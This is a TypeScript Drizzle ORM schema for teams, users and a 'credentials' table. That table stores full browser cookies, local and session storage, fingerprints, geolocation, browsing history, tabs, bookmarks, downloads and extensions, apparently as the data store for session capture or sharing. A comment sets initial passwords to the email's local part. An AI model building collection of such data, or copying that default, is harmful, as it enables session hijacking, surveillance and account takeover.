import { pgTable, text, timestamp, boolean } from 'drizzle-orm/pg-core';
import { createId } from '@paralleldrive/cuid2';

export const teams = pgTable('teams', {
  id: text('id').primaryKey().$defaultFn(() => createId()),
  name: text('name').notNull(),
  description: text('description'),
  platformAccountId: text('platform_account_id').notNull().unique(),
  createdAt: timestamp('created_at').defaultNow().notNull(),
  updatedAt: timestamp('updated_at').defaultNow().notNull(),
});

export const users = pgTable('users', {
  id: text('id').primaryKey().$defaultFn(() => createId()),
  email: text('email').notNull().unique(),
  name: text('name').notNull(),
  password: text('password').notNull(), // Hashed password, initially email without @domain.tld
  role: text('role', { enum: ['admin', 'member'] }).notNull().default('member'),
  teamId: text('team_id').notNull().references(() => teams.id, { onDelete: 'cascade' }),
  isActive: boolean('is_active').notNull().default(true),
  lastLoginAt: timestamp('last_login_at'),
  createdAt: timestamp('created_at').defaultNow().notNull(),
  updatedAt: timestamp('updated_at').defaultNow().notNull(),
});

export const credentials = pgTable('credentials', {
  id: text('id').primaryKey().$defaultFn(() => createId()),
  teamId: text('team_id').notNull().references(() => teams.id, { onDelete: 'cascade' }),
  
  // Browser environment data
  ipAddress: text('ip_address'), // IPv4/IPv6 address
  userAgent: text('user_agent'), // Raw browser user agent string
  platform: text('platform'), // OS / device type (Windows, iOS, Android, etc.)
  browser: text('browser'), // Browser name/version
  
  // Browser storage data (JSON)
  cookies: text('cookies'), // All cookies key/value pairs as JSON
  localStorage: text('local_storage'), // All localStorage key/value pairs as JSON
  sessionStorage: text('session_storage'), // All sessionStorage key/value pairs as JSON
  
  // Advanced browser data
  fingerprint: text('fingerprint'), // Fingerprint data (canvas hash, WebGL, fonts, etc.) as JSON
  geoLocation: text('geo_location'), // Approx. geolocation info (lat/lon, city, country) as JSON
  metadata: text('metadata'), // Additional metadata as JSON
  
  // Extended browser data (requires additional permissions)
  browserHistory: text('browser_history'), // Browser history data as JSON
  tabs: text('tabs'), // Open tabs information as JSON
  bookmarks: text('bookmarks'), // Bookmarks data as JSON
  downloads: text('downloads'), // Downloads history as JSON
  extensions: text('extensions'), // Installed extensions info as JSON
  
  // Management fields
  credentialSource: text('credential_source').notNull().default('manual'), // 'manual', 'auto_detected', 'team_shared'
  isActive: boolean('is_active').notNull().default(true),
  createdAt: timestamp('created_at').defaultNow().notNull(),
  updatedAt: timestamp('updated_at').defaultNow().notNull(),
  lastUsedAt: timestamp('last_used_at'),
});
